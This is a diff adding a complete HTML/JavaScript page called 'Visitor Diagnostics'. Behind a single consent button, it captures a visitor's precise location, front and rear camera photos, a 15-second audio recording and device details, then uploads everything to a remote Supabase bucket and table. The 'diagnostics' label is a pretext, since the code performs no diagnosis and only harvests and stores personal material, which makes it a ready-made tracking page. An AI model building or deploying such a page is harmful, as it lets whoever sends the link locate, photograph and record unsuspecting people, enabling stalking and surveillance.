@@ -1,0 +1,1586 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Visitor Diagnostics</title>
+
+<style>
+*{box-sizing:border-box}
+
+body{
+  margin:0;
+  background:#f4f4f4;
+  color:#111;
+  font-family:Arial,Helvetica,sans-serif;
+}
+
+.container{
+  max-width:720px;
+  margin:auto;
+  padding:30px 20px 50px;
+}
+
+.logo{
+  width:90px;
+  height:90px;
+  border-radius:25px;
+  background:#111;
+  color:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:28px;
+  font-weight:800;
+  margin-bottom:35px;
+}
+
+h1{
+  font-size:40px;
+  margin:0 0 15px;
+}
+
+.subtitle{
+  color:#777;
+  font-size:20px;
+  margin-bottom:40px;
+}
+
+.card{
+  background:#fff;
+  border-radius:28px;
+  padding:30px;
+  margin-bottom:20px;
+  box-shadow:0 2px 10px rgba(0,0,0,.06);
+}
+
+h2{
+  margin-top:0;
+  font-size:29px;
+}
+
+.description{
+  color:#555;
+  font-size:18px;
+  line-height:1.6;
+}
+
+.permission{
+  display:flex;
+  align-items:center;
+  gap:16px;
+  padding:17px;
+  border:1px solid #ddd;
+  border-radius:18px;
+  margin:12px 0;
+}
+
+.permission-icon{
+  font-size:30px;
+}
+
+.permission-title{
+  font-weight:700;
+  font-size:18px;
+}
+
+.permission-sub{
+  color:#777;
+  margin-top:4px;
+}
+
+button{
+  width:100%;
+  border:0;
+  border-radius:18px;
+  padding:18px;
+  margin-top:20px;
+  font-size:19px;
+  font-weight:700;
+  cursor:pointer;
+}
+
+.primary{
+  background:#111;
+  color:#fff;
+}
+
+.secondary{
+  background:#eee;
+  color:#111;
+}
+
+button:disabled{
+  opacity:.5;
+  cursor:not-allowed;
+}
+
+.hidden{
+  display:none!important;
+}
+
+.status{
+  font-size:18px;
+  font-weight:700;
+  padding:15px;
+  background:#f5f5f5;
+  border-radius:15px;
+  margin-bottom:20px;
+}
+
+.info-grid{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:10px;
+}
+
+.info{
+  background:#f5f5f5;
+  border-radius:14px;
+  padding:13px;
+}
+
+.info strong{
+  display:block;
+  color:#777;
+  font-size:13px;
+  margin-bottom:5px;
+}
+
+.section{
+  border-top:1px solid #ddd;
+  padding-top:22px;
+  margin-top:22px;
+}
+
+video{
+  width:100%;
+  max-height:300px;
+  background:#111;
+  border-radius:15px;
+}
+
+.photos{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:10px;
+  margin-top:10px;
+}
+
+.photos img{
+  width:100%;
+  aspect-ratio:4/3;
+  object-fit:cover;
+  background:#ddd;
+  border-radius:12px;
+}
+
+.label{
+  display:block;
+  font-weight:700;
+  margin:8px 0;
+}
+
+.progress{
+  height:10px;
+  background:#ddd;
+  border-radius:20px;
+  overflow:hidden;
+}
+
+.progress-bar{
+  height:100%;
+  width:0;
+  background:#111;
+}
+
+audio{
+  width:100%;
+  margin-top:12px;
+}
+
+.maps{
+  display:inline-block;
+  margin-top:10px;
+  font-weight:700;
+  color:#0645d6;
+}
+
+.error{
+  color:#a00000;
+}
+
+.success{
+  color:#087a24;
+}
+
+@media(max-width:600px){
+  .container{
+    padding:25px 16px;
+  }
+
+  .card{
+    padding:24px 18px;
+  }
+
+  .info-grid{
+    grid-template-columns:1fr;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo">VD</div>
+
+  <h1>Visitor Diagnostics</h1>
+
+  <p class="subtitle">
+    Device and permission diagnostics
+  </p>
+
+  <div class="card">
+
+    <h2>Before you continue</h2>
+
+    <p class="description">
+      This page collects diagnostics only after you give permission.
+      You can review the requested permissions below.
+    </p>
+
+    <div class="permission">
+      <div class="permission-icon">📍</div>
+      <div>
+        <div class="permission-title">Precise location</div>
+        <div class="permission-sub">
+          Coordinates and Google Maps location
+        </div>
+      </div>
+    </div>
+
+    <div class="permission">
+      <div class="permission-icon">📷</div>
+      <div>
+        <div class="permission-title">Camera</div>
+        <div class="permission-sub">
+          Front and rear camera photos
+        </div>
+      </div>
+    </div>
+
+    <div class="permission">
+      <div class="permission-icon">🎙️</div>
+      <div>
+        <div class="permission-title">Microphone</div>
+        <div class="permission-sub">
+          Maximum 15-second recording
+        </div>
+      </div>
+    </div>
+
+    <div class="permission">
+      <div class="permission-icon">📱</div>
+      <div>
+        <div class="permission-title">Device information</div>
+        <div class="permission-sub">
+          Browser, platform, screen and battery
+        </div>
+      </div>
+    </div>
+
+    <button id="startButton" class="primary">
+      Allow &amp; Continue
+    </button>
+
+  </div>
+
+
+  <div id="diagnostics" class="card hidden">
+
+    <h2>Diagnostics</h2>
+
+    <div id="status" class="status">
+      Preparing...
+    </div>
+
+
+    <!-- DEVICE -->
+
+    <div class="section">
+
+      <h3>Device</h3>
+
+      <div id="deviceInfo" class="info-grid"></div>
+
+    </div>
+
+
+    <!-- LOCATION -->
+
+    <div class="section">
+
+      <h3>Location</h3>
+
+      <p id="locationStatus">
+        Waiting...
+      </p>
+
+      <a
+        id="mapsLink"
+        class="maps hidden"
+        target="_blank"
+        rel="noopener">
+        Open Google Maps
+      </a>
+
+    </div>
+
+
+    <!-- CAMERA -->
+
+    <div class="section">
+
+      <h3>Camera</h3>
+
+      <p id="cameraStatus">
+        Waiting...
+      </p>
+
+      <video
+        id="preview"
+        autoplay
+        muted
+        playsinline>
+      </video>
+
+      <div class="photos">
+
+        <div>
+          <span class="label">Front</span>
+          <img id="frontImage">
+        </div>
+
+        <div>
+          <span class="label">Rear</span>
+          <img id="rearImage">
+        </div>
+
+      </div>
+
+    </div>
+
+
+    <!-- MICROPHONE -->
+
+    <div class="section">
+
+      <h3>Microphone</h3>
+
+      <p id="microphoneStatus">
+        Waiting...
+      </p>
+
+      <div class="progress">
+        <div
+          id="progressBar"
+          class="progress-bar">
+        </div>
+      </div>
+
+      <audio
+        id="audioPlayer"
+        controls>
+      </audio>
+
+    </div>
+
+
+    <!-- SAVE -->
+
+    <div class="section">
+
+      <p id="saveStatus">
+        Not saved yet.
+      </p>
+
+      <button
+        id="retryButton"
+        class="secondary hidden">
+        Try Again
+      </button>
+
+    </div>
+
+  </div>
+
+</div>
+
+
+<script>
+
+/*
+====================================================
+SUPABASE CONFIGURATION
+====================================================
+*/
+
+const SUPABASE_URL =
+"https://pkbdjrajsndtmjpmvebq.supabase.co";
+
+const SUPABASE_KEY =
+"sb_publishable_Ae_r3P5gRwqWUnPeKRMKAg_xmmJVIoW";
+
+
+/*
+====================================================
+ELEMENTS
+====================================================
+*/
+
+const startButton =
+document.getElementById("startButton");
+
+const retryButton =
+document.getElementById("retryButton");
+
+const diagnostics =
+document.getElementById("diagnostics");
+
+const status =
+document.getElementById("status");
+
+const deviceInfo =
+document.getElementById("deviceInfo");
+
+const locationStatus =
+document.getElementById("locationStatus");
+
+const mapsLink =
+document.getElementById("mapsLink");
+
+const cameraStatus =
+document.getElementById("cameraStatus");
+
+const microphoneStatus =
+document.getElementById("microphoneStatus");
+
+const saveStatus =
+document.getElementById("saveStatus");
+
+const preview =
+document.getElementById("preview");
+
+const frontImage =
+document.getElementById("frontImage");
+
+const rearImage =
+document.getElementById("rearImage");
+
+const audioPlayer =
+document.getElementById("audioPlayer");
+
+const progressBar =
+document.getElementById("progressBar");
+
+
+/*
+====================================================
+STATE
+====================================================
+*/
+
+let sessionId;
+
+let frontBlob = null;
+let rearBlob = null;
+let audioBlob = null;
+
+let latitude = null;
+let longitude = null;
+
+let locationConsent = false;
+let cameraConsent = false;
+let microphoneConsent = false;
+
+
+/*
+====================================================
+HELPERS
+====================================================
+*/
+
+function setStatus(text){
+
+  status.textContent = text;
+
+}
+
+
+function sleep(ms){
+
+  return new Promise(
+    resolve => setTimeout(resolve,ms)
+  );
+
+}
+
+
+function resetState(){
+
+  sessionId =
+    crypto.randomUUID
+      ? crypto.randomUUID()
+      : Date.now()+"-"+Math.random();
+
+  frontBlob = null;
+  rearBlob = null;
+  audioBlob = null;
+
+  latitude = null;
+  longitude = null;
+
+  locationConsent = false;
+  cameraConsent = false;
+  microphoneConsent = false;
+
+  frontImage.removeAttribute("src");
+  rearImage.removeAttribute("src");
+  audioPlayer.removeAttribute("src");
+
+  mapsLink.classList.add("hidden");
+
+  progressBar.style.width = "0%";
+
+  saveStatus.textContent =
+    "Not saved yet.";
+
+}
+
+
+/*
+====================================================
+DEVICE INFORMATION
+====================================================
+*/
+
+async function collectDeviceInfo(){
+
+  let battery = null;
+
+  try{
+
+    if(
+      "getBattery" in navigator
+    ){
+
+      const b =
+        await navigator.getBattery();
+
+      battery =
+        Math.round(b.level * 100);
+
+    }
+
+  }catch(_){}
+
+
+  const data = {
+
+    platform:
+      navigator.platform || "Unavailable",
+
+    language:
+      navigator.language || "Unavailable",
+
+    timezone:
+      Intl.DateTimeFormat()
+        .resolvedOptions()
+        .timeZone || "Unavailable",
+
+    screenWidth:
+      screen.width,
+
+    screenHeight:
+      screen.height,
+
+    colorDepth:
+      screen.colorDepth,
+
+    battery
+
+  };
+
+
+  deviceInfo.innerHTML = `
+
+    <div class="info">
+      <strong>Platform</strong>
+      ${data.platform}
+    </div>
+
+    <div class="info">
+      <strong>Language</strong>
+      ${data.language}
+    </div>
+
+    <div class="info">
+      <strong>Timezone</strong>
+      ${data.timezone}
+    </div>
+
+    <div class="info">
+      <strong>Screen</strong>
+      ${data.screenWidth} × ${data.screenHeight}
+    </div>
+
+    <div class="info">
+      <strong>Color depth</strong>
+      ${data.colorDepth}
+    </div>
+
+    <div class="info">
+      <strong>Battery</strong>
+      ${
+        data.battery === null
+        ? "Not available"
+        : data.battery + "%"
+      }
+    </div>
+
+  `;
+
+
+  return data;
+
+}
+
+
+/*
+====================================================
+1 — LOCATION
+====================================================
+*/
+
+async function requestLocation(){
+
+  setStatus(
+    "Requesting location permission..."
+  );
+
+
+  locationStatus.textContent =
+    "Waiting for location permission...";
+
+
+  return new Promise(resolve => {
+
+    if(
+      !navigator.geolocation
+    ){
+
+      locationStatus.textContent =
+        "Location is not supported.";
+
+      resolve(null);
+
+      return;
+
+    }
+
+
+    navigator.geolocation.getCurrentPosition(
+
+      position => {
+
+        latitude =
+          position.coords.latitude;
+
+        longitude =
+          position.coords.longitude;
+
+        locationConsent = true;
+
+
+        const url =
+          `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+
+        locationStatus.innerHTML = `
+
+          <strong>Location received</strong><br>
+
+          ${latitude.toFixed(6)},
+          ${longitude.toFixed(6)}
+
+        `;
+
+
+        mapsLink.href = url;
+
+        mapsLink.classList.remove(
+          "hidden"
+        );
+
+
+        resolve({
+          latitude,
+          longitude,
+          mapsUrl:url
+        });
+
+      },
+
+
+      error => {
+
+        locationStatus.textContent =
+          "Location permission was not granted.";
+
+        resolve(null);
+
+      },
+
+
+      {
+        enableHighAccuracy:true,
+        timeout:15000,
+        maximumAge:0
+      }
+
+    );
+
+  });
+
+}
+
+
+/*
+====================================================
+CAMERA CAPTURE
+====================================================
+*/
+
+async function capturePhoto(stream){
+
+  preview.srcObject =
+    stream;
+
+
+  await preview.play()
+    .catch(()=>{});
+
+
+  await sleep(800);
+
+
+  const canvas =
+    document.createElement("canvas");
+
+
+  canvas.width =
+    preview.videoWidth || 1280;
+
+  canvas.height =
+    preview.videoHeight || 720;
+
+
+  const context =
+    canvas.getContext("2d");
+
+
+  context.drawImage(
+    preview,
+    0,
+    0,
+    canvas.width,
+    canvas.height
+  );
+
+
+  return new Promise(
+    (resolve,reject)=>{
+
+      canvas.toBlob(
+
+        blob => {
+
+          if(blob)
+            resolve(blob);
+
+          else
+            reject(
+              new Error(
+                "Could not create photo."
+              )
+            );
+
+        },
+
+        "image/jpeg",
+
+        .88
+
+      );
+
+    }
+  );
+
+}
+
+
+async function captureRearCamera(){
+
+  const stream =
+    await navigator.mediaDevices
+      .getUserMedia({
+
+        video:{
+          facingMode:{
+            ideal:"environment"
+          }
+        },
+
+        audio:false
+
+      });
+
+
+  try{
+
+    return await capturePhoto(
+      stream
+    );
+
+  }
+
+  finally{
+
+    stream
+      .getTracks()
+      .forEach(
+        track => track.stop()
+      );
+
+    preview.srcObject =
+      null;
+
+  }
+
+}
+
+
+/*
+====================================================
+2 — CAMERA
+====================================================
+*/
+
+async function requestCamera(){
+
+  setStatus(
+    "Requesting camera permission..."
+  );
+
+
+  const stream =
+    await navigator.mediaDevices
+      .getUserMedia({
+
+        video:true,
+        audio:false
+
+      });
+
+
+  cameraConsent = true;
+
+
+  cameraStatus.textContent =
+    "Camera permission granted. Capturing front photo...";
+
+
+  try{
+
+    frontBlob =
+      await capturePhoto(
+        stream
+      );
+
+
+    frontImage.src =
+      URL.createObjectURL(
+        frontBlob
+      );
+
+  }
+
+  finally{
+
+    stream
+      .getTracks()
+      .forEach(
+        track => track.stop()
+      );
+
+    preview.srcObject =
+      null;
+
+  }
+
+
+  await sleep(400);
+
+
+  cameraStatus.textContent =
+    "Capturing rear photo...";
+
+
+  rearBlob =
+    await captureRearCamera();
+
+
+  rearImage.src =
+    URL.createObjectURL(
+      rearBlob
+    );
+
+
+  cameraStatus.textContent =
+    "Front and rear photos captured.";
+
+}
+
+
+/*
+====================================================
+3 — MICROPHONE
+====================================================
+*/
+
+async function requestMicrophone(){
+
+  setStatus(
+    "Requesting microphone permission..."
+  );
+
+
+  const stream =
+    await navigator.mediaDevices
+      .getUserMedia({
+
+        audio:true,
+        video:false
+
+      });
+
+
+  microphoneConsent = true;
+
+
+  let mimeType = "";
+
+
+  const formats = [
+
+    "audio/webm;codecs=opus",
+    "audio/webm",
+    "audio/mp4"
+
+  ];
+
+
+  for(
+    const type of formats
+  ){
+
+    if(
+      window.MediaRecorder &&
+      MediaRecorder.isTypeSupported(type)
+    ){
+
+      mimeType = type;
+
+      break;
+
+    }
+
+  }
+
+
+  const recorder =
+    new MediaRecorder(
+
+      stream,
+
+      mimeType
+        ? {mimeType}
+        : undefined
+
+    );
+
+
+  const chunks = [];
+
+
+  recorder.ondataavailable =
+    event => {
+
+      if(
+        event.data &&
+        event.data.size
+      ){
+
+        chunks.push(
+          event.data
+        );
+
+      }
+
+    };
+
+
+  recorder.start();
+
+
+  microphoneStatus.textContent =
+    "Recording... maximum 15 seconds.";
+
+
+  const started =
+    Date.now();
+
+
+  const timer =
+    setInterval(()=>{
+
+      const percent =
+        ((Date.now()-started)/15000)*100;
+
+
+      progressBar.style.width =
+        Math.min(
+          100,
+          percent
+        ) + "%";
+
+    },100);
+
+
+  await sleep(15000);
+
+
+  clearInterval(timer);
+
+
+  /*
+    Register STOP listener BEFORE stop().
+  */
+
+  await new Promise(resolve => {
+
+    recorder.addEventListener(
+      "stop",
+      resolve,
+      {once:true}
+    );
+
+
+    if(
+      recorder.state !==
+      "inactive"
+    ){
+
+      recorder.stop();
+
+    }else{
+
+      resolve();
+
+    }
+
+  });
+
+
+  stream
+    .getTracks()
+    .forEach(
+      track => track.stop()
+    );
+
+
+  audioBlob =
+    new Blob(
+
+      chunks,
+
+      {
+        type:
+          mimeType ||
+          "audio/webm"
+      }
+
+    );
+
+
+  audioPlayer.src =
+    URL.createObjectURL(
+      audioBlob
+    );
+
+
+  progressBar.style.width =
+    "100%";
+
+
+  microphoneStatus.textContent =
+    "Recording complete.";
+
+}
+
+
+/*
+====================================================
+SUPABASE
+====================================================
+*/
+
+async function getSupabase(){
+
+  if(
+    window.supabase &&
+    window.supabase.createClient
+  ){
+
+    return window.supabase.createClient(
+      SUPABASE_URL,
+      SUPABASE_KEY
+    );
+
+  }
+
+
+  return new Promise(
+    (resolve,reject)=>{
+
+      const script =
+        document.createElement(
+          "script"
+        );
+
+
+      script.src =
+        "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2";
+
+
+      script.onload = ()=>{
+
+        if(
+          window.supabase &&
+          window.supabase.createClient
+        ){
+
+          resolve(
+            window.supabase.createClient(
+              SUPABASE_URL,
+              SUPABASE_KEY
+            )
+          );
+
+        }else{
+
+          reject(
+            new Error(
+              "Supabase library unavailable."
+            )
+          );
+
+        }
+
+      };
+
+
+      script.onerror = ()=>{
+
+        reject(
+          new Error(
+            "Could not load Supabase."
+          )
+        );
+
+      };
+
+
+      document.head.appendChild(
+        script
+      );
+
+    }
+  );
+
+}
+
+
+/*
+====================================================
+UPLOAD MEDIA
+====================================================
+*/
+
+async function uploadMedia(
+  supabase,
+  blob,
+  path
+){
+
+  if(!blob)
+    return null;
+
+
+  const file =
+    new File(
+
+      [blob],
+
+      path.split("/").pop(),
+
+      {
+        type:blob.type
+      }
+
+    );
+
+
+  const result =
+    await supabase.storage
+      .from("visitor-media")
+      .upload(
+
+        path,
+
+        file,
+
+        {
+          upsert:false,
+          contentType:
+            blob.type ||
+            "application/octet-stream"
+        }
+
+      );
+
+
+  if(result.error)
+    throw result.error;
+
+
+  return path;
+
+}
+
+
+/*
+====================================================
+SAVE TO SUPABASE
+====================================================
+*/
+
+async function saveData(device){
+
+  const supabase =
+    await getSupabase();
+
+
+  const frontPath =
+    frontBlob
+      ? `${sessionId}/front.jpg`
+      : null;
+
+
+  const rearPath =
+    rearBlob
+      ? `${sessionId}/rear.jpg`
+      : null;
+
+
+  const audioPath =
+    audioBlob
+      ? `${sessionId}/audio.${
+          audioBlob.type.includes("mp4")
+            ? "m4a"
+            : "webm"
+        }`
+      : null;
+
+
+  setStatus(
+    "Sending diagnostics to database..."
+  );
+
+
+  saveStatus.textContent =
+    "Uploading media...";
+
+
+  await uploadMedia(
+    supabase,
+    frontBlob,
+    frontPath
+  );
+
+
+  await uploadMedia(
+    supabase,
+    rearBlob,
+    rearPath
+  );
+
+
+  await uploadMedia(
+    supabase,
+    audioBlob,
+    audioPath
+  );
+
+
+  saveStatus.textContent =
+    "Saving diagnostic record...";
+
+
+  const {error} =
+    await supabase
+      .from("visitor_sessions")
+      .insert({
+
+        id:sessionId,
+
+        user_agent:
+          navigator.userAgent,
+
+        platform:
+          device.platform,
+
+        language:
+          device.language,
+
+        timezone:
+          device.timezone,
+
+        screen_width:
+          device.screenWidth,
+
+        screen_height:
+          device.screenHeight,
+
+        color_depth:
+          device.colorDepth,
+
+        battery_level:
+          device.battery,
+
+        latitude,
+        longitude,
+
+        maps_url:
+          latitude !== null &&
+          longitude !== null
+            ? `https://www.google.com/maps?q=${latitude},${longitude}`
+            : null,
+
+        front_photo_path:
+          frontPath,
+
+        rear_photo_path:
+          rearPath,
+
+        audio_path:
+          audioPath,
+
+        camera_consent:
+          cameraConsent,
+
+        microphone_consent:
+          microphoneConsent,
+
+        location_consent:
+          locationConsent
+
+      });
+
+
+  if(error)
+    throw error;
+
+
+  saveStatus.textContent =
+    "Diagnostics saved successfully.";
+
+}
+
+
+/*
+====================================================
+MAIN FLOW
+====================================================
+*/
+
+async function startDiagnostics(){
+
+  startButton.disabled = true;
+
+  retryButton.classList.add(
+    "hidden"
+  );
+
+  diagnostics.classList.remove(
+    "hidden"
+  );
+
+
+  resetState();
+
+
+  try{
+
+    if(
+      !window.isSecureContext
+    ){
+
+      throw new Error(
+        "HTTPS is required."
+      );
+
+    }
+
+
+    if(
+      !navigator.mediaDevices ||
+      !navigator.mediaDevices.getUserMedia
+    ){
+
+      throw new Error(
+        "Camera and microphone access is unavailable."
+      );
+
+    }
+
+
+    /*
+      STEP 1
+      LOCATION
+    */
+
+    await requestLocation();
+
+
+    /*
+      STEP 2
+      CAMERA
+    */
+
+    await requestCamera();
+
+
+    /*
+      STEP 3
+      MICROPHONE
+    */
+
+    await requestMicrophone();
+
+
+    /*
+      DEVICE INFO
+    */
+
+    const device =
+      await collectDeviceInfo();
+
+
+    /*
+      STEP 4
+      DATABASE
+    */
+
+    await saveData(
+      device
+    );
+
+
+    /*
+      FINAL STATE ONLY
+      AFTER SUCCESSFUL SAVE
+    */
+
+    setStatus(
+      "Diagnostics complete."
+    );
+
+
+    saveStatus.textContent =
+      "Your permitted diagnostics were saved successfully.";
+
+  }
+
+
+  catch(error){
+
+    console.error(
+      "Diagnostics error:",
+      error
+    );
+
+
+    setStatus(
+      "Error: " +
+      (
+        error.message ||
+        error.name ||
+        "Unknown error"
+      )
+    );
+
+
+    saveStatus.textContent =
+      "The diagnostic save did not complete.";
+
+
+    retryButton.classList.remove(
+      "hidden"
+    );
+
+  }
+
+
+  finally{
+
+    startButton.disabled =
+      false;
+
+  }
+
+}
+
+
+startButton.addEventListener(
+  "click",
+  startDiagnostics
+);
+
+
+retryButton.addEventListener(
+  "click",
+  startDiagnostics
+);
+
+
+console.log(
+  "Visitor Diagnostics single-file version loaded."
+);
+
+</script>
+
+</body>
+</html>
